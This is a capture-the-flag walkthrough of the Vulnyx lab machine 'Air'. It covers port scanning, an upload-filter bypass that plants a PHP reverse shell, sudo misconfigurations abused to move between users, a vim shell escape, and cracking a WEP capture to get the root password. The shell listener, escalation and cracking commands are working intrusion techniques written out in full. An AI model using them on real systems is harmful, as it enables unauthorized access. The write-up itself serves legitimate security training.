# **Vulnyx**

![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/1d217752-2e3f-41a3-998d-1db0aaeb2c3c)

***

Running our nmap scan we have 3 opened ports


```
# Nmap 7.94SVN scan initiated Sat May 25 00:09:32 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.43.6
Nmap scan report for air (192.168.43.6)
Host is up (0.00033s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 0e:95:f2:88:f3:0f:ca:38:ec:da:3c:c0:cd:19:20:41 (ECDSA)
|_  256 53:21:e1:34:a6:f0:70:2b:87:e7:cf:3d:6b:85:9d:64 (ED25519)
80/tcp   open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Welcome to nginx!
| http-methods: 
|_  Supported Methods: GET HEAD
8080/tcp open  http    nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://air.nyx:8080/
|_http-server-header: nginx/1.22.1
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 25 00:09:41 2024 -- 1 IP address (1 host up) scanned in 9.32 seconds
```



Navigating to port 80/HTTP we have this nginx default web page 


![](https://i.imgur.com/j3igbX7.png)



We can go ahead and perform a directory bruteforce using the `dirsearch` tool 



![](https://i.imgur.com/0zaSreg.png)



We have a suspicious `/files` directory 



![](https://i.imgur.com/KCgT3PC.png)



Navigating to port 8080 we are refereed to air.nyx


![](https://i.imgur.com/vEgylpH.png)


Go ahead and add this domain to our `/etc/hosts` file



![](https://i.imgur.com/LTBzGSQ.png)


Navigating to the web page we have this 



![](https://i.imgur.com/gfCoobR.png)


Clicking on the upload bar i was able to upload image files 



![](https://i.imgur.com/B3qluU8.png)



....and yeah the upload directory was guessable (CTF experience :D)


![](https://i.imgur.com/FCseSpd.png)




So i created a php reverse shell with the file name `shell.php#.png`


![](https://i.imgur.com/VLU8XWs.png)


Still turns out we where caught, sooo the best bet is to fire up burp suite



![](https://i.imgur.com/SInpspq.png)



We where able to bypass this by uploading a valid image and then stripping out few data from this file replacing it with our php reverse shell payload



![](https://i.imgur.com/OIE5lAM.png)



Then we can navigate to http://air.nyx:8080/uploads/wtf.php and then start up our listener in which we should get a reverse shell


```
nc -lvnp 4444
```



![](https://i.imgur.com/c3Gmp12.png)


Then we can stabilize our shell


```
python3 -c 'import pty;pty.spawn("/bin/bash")'
[Ctrl+z]
stty raw -echo;fg
export TERM=xterm-256color
```



Running `sudo -l` we have writable permissions to a file called `air-repeater` as user **sam**



![](https://i.imgur.com/AaDXd53.png)



We can move laterally to user **sam** by copying the `/bin/bash` shell here



```
cp /bin/bash air-repeater
sudo -u sam /opt/air-repeater 
```




![](https://i.imgur.com/69SHU6E.png)




Running `sudo -l` again we can run the binary `/usr/bin/vifm` as user **xiao**



![](https://i.imgur.com/q2jDvx9.png)



Running `sudo -u xiao /usr/bin/vifm` we are dropped in some kind of interface where we have the content of user **xiao** directory



![](https://i.imgur.com/KYB9PmG.png)



Pressing the enter key on the `user.txt` file we are dropped into vim, we can get a shell as user **xiao** by doing the below


![](https://i.imgur.com/aHPixsX.png)


......and we got a shell xD


![](https://i.imgur.com/uZYfgbi.png)



Running linpeas i found a sus file under `/var/backups`


![](https://i.imgur.com/vGllvJj.png)



Then i unzipped this file to the `/tmp` directory


```
unzip Air-Master.zip -d /tmp
```



![](https://i.imgur.com/J1sSAXC.png)



Using [this](https://www.reviversoft.com/en/file-extensions/ivs) article i was made to realize that `.ivs` files are Initialization Vector Files used by `Aircrack-ng` as well as other applications for WEP wireless network key cracking. So let transfer the `.ivs` file to our machine.



![](https://i.imgur.com/4Zoa4do.png)



Using [this](https://github.com/openwall/john/issues/371#issuecomment-23950687) article i was made to understand that this is complex but hell yeah, there is always a way. First of all create `.hccap` file from the original `.ivs` file


```bash
aircrack-ng -J new Air-Master-01.ivs
```


![](https://i.imgur.com/EVcys8O.png)



Then use `hccap2john` to convert the `.hccap` file to a crack able file by `JtR`


```
hccap2john new.hccap > hash.txt
```



Now crack the hash with `JtR`


```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```




![](https://i.imgur.com/ueWhGRz.png)



Password => `cheerleading`



Let try the password for the user root


![](https://i.imgur.com/y09rUoN.png)



Which works EzPz, Have a nice day

https://i.pinimg.com/originals/44/4b/8f/444b8f406347a470a7de5478206dd158.gif

<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>

